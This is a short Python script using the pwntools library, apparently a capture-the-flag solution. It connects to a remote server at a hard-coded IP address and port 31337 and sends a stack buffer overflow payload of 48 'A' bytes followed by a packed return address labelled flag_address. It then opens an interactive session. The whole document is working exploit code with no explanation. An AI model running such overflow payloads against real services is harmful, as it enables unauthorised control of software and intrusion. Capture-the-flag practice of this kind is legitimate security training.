from pwn import *


r = remote('89.38.210.128', 31337)

msg = r.recv(10)
flag_address = 0x08048660
no_of_bytes = 48

r.sendline('31337')
msg = r.recvline()

buf  = 'A'*no_of_bytes
buf += p32(flag_address)
r.sendline(buf)

r.recvline()

r.interactive()